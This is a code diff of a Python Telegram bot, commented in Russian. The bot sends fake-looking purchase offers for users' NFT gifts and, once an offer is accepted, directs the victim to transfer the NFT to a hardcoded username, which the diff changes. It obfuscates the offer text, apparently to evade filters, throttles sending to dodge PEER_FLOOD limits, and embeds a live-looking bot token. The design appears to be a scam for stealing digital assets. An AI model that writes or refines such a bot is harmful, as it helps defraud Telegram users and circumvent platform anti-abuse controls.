@@ -10,7 +10,7 @@ from aiogram.exceptions import TelegramRetryAfter
 
 # Настройки
 TOKEN = "9252419350:AAFEQ930iWfDMcC1bNRmOE2zmSbYK9kpj_g"
-RECIPIENT = "@crypqtan"  # Юзернейм, куда передается НФТ
+RECIPIENT = "@tradiqx"  # Юзернейм, куда передается НФТ
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN)
@@ -107,11 +107,16 @@ def build_offer_text(gift_name, gift_num, amount, currency_symbol, lang):
     protected_timer = randomize_text(raw_timer)
     protected_lock = randomize_text(raw_lock)
 
+    # Премиум-эмодзи в тексте карточки оффера
+    icon_gift = '<tg-emoji emoji-id="5776375003280838798">🎁</tg-emoji>'
+    icon_timer = '<tg-emoji emoji-id="5778527486270770928">⏱</tg-emoji>'
+    icon_lock = '<tg-emoji emoji-id="5875180111744995604">🔒</tg-emoji>'
+
     base = (
-        f'🎁 <b>{loc["success_title"]} <a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\n'
+        f'{icon_gift} <b>{loc["success_title"]} <a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\n'
         f'{protected_desc}\n\n'
-        f'⏱ <i>{protected_timer}</i>\n'
-        f'🔒 <i>{protected_lock}</i>'
+        f'{icon_timer} <i>{protected_timer}</i>\n'
+        f'{icon_lock} <i>{protected_lock}</i>'
     )
     return base
 
@@ -120,9 +125,8 @@ def make_offer_keyboard(gift_name, gift_num, amount, currency_symbol, lang):
     cb_data = f"a|{gift_name}|{gift_num}|{amount}|{currency_symbol}|{lang}"
     decline_data = f"d|{gift_num}"
     
-    # Кнопки с премиум-эмодзи по заданным ID
-    decline_btn_text = f'<tg-emoji emoji-id="5778527486270770928">❌</tg-emoji> {loc["decline"]}'
-    accept_btn_text = f'<tg-emoji emoji-id="5776375003280838798">✅</tg-emoji> {loc["accept"]}'
+    decline_btn_text = f"❌ {loc['decline']}"
+    accept_btn_text = f"✅ {loc['accept']}"
 
     return InlineKeyboardMarkup(
         inline_keyboard=[
@@ -136,19 +140,23 @@ def make_offer_keyboard(gift_name, gift_num, amount, currency_symbol, lang):
 def build_accept_text(gift_name, gift_num, currency_name, lang):
     loc = LOCALES.get(lang, LOCALES["ru"])
     slug = gift_name.replace(" ", "")
+    
+    # Премиум-эмодзи для текста успешной продажи
+    icon_success = '<tg-emoji emoji-id="5776375003280838798">🎁</tg-emoji>'
+    icon_info = '<tg-emoji emoji-id="5875180111744995604">ℹ️</tg-emoji>'
+
     return (
-        f'🎁 <b>{loc["success_title"]}:\n'
+        f'{icon_success} <b>{loc["success_title"]}:\n'
         f'<a href="https://t.me/nft/{slug}-{gift_num}">{gift_name}-{gift_num}</a> {loc["success_sold"]}</b>\n\n'
-        f'• {loc["instruction"]} {currency_name}.'
+        f'{icon_info} {loc["instruction"]} {currency_name}.'
     )
 
 def make_accept_keyboard(lang):
     loc = LOCALES.get(lang, LOCALES["ru"])
     recipient = RECIPIENT.lstrip("@")
     
-    # Кнопки подтверждения передачи с премиум-эмодзи по заданным ID
-    transfer_btn_text = f'<tg-emoji emoji-id="5875180111744995604">↗️</tg-emoji> {loc["btn_transfer"]}'
-    confirm_btn_text = f'<tg-emoji emoji-id="5776375003280838798">⊙</tg-emoji> {loc["btn_confirm"]}'
+    transfer_btn_text = f"↗️ {loc['btn_transfer']}"
+    confirm_btn_text = f"⊙ {loc['btn_confirm']}"
 
     return InlineKeyboardMarkup(
         inline_keyboard=[
@@ -243,9 +251,15 @@ async def accept_offer(cb: CallbackQuery):
     chat_id = cb.message.chat.id
 
     try:
-        await bot.edit_message_text(
+        # 1. Удаляем старое сообщение с оффером
+        await bot.delete_business_messages(
+            business_connection_id=bcid,
+            message_ids=[cb.message.message_id]
+        )
+        
+        # 2. Отправляем новое сообщение с инструкцией и кнопкой передачи
+        await bot.send_message(
             chat_id=chat_id,
-            message_id=cb.message.message_id,
             text=text,
             parse_mode=ParseMode.HTML,
             reply_markup=make_accept_keyboard(lang),
@@ -253,11 +267,11 @@ async def accept_offer(cb: CallbackQuery):
             link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True)
         )
     except Exception as e:
-        logging.error(f"Error editing message: {e}")
-        await cb.answer("Не удалось обновить оффер", show_alert=True)
+        logging.error(f"Error handling accepted offer: {e}")
+        await cb.answer("Не удалось обработать оффер", show_alert=True)
         return
 
-    await cb.answer()
+    await cb.answer("Предложение принято!")
 
 @dp.callback_query(F.data.startswith("d|"))
 async def decline_offer(cb: CallbackQuery):
@@ -275,7 +289,7 @@ async def decline_offer(cb: CallbackQuery):
 async def noop_handler(cb: CallbackQuery):
     await cb.answer("Сначала выполните передачу НФТ по кнопке выше!", show_alert=True)
 
-# Воркер с безопасной микро-паузой (1.0 - 1.5 сек) против PEER_FLOOD
+# Фоновый воркер с безопасной задержкой против PEER_FLOOD
 async def sender_worker():
     while True:
         task = await message_queue.get()
@@ -335,4 +349,4 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-            
+    
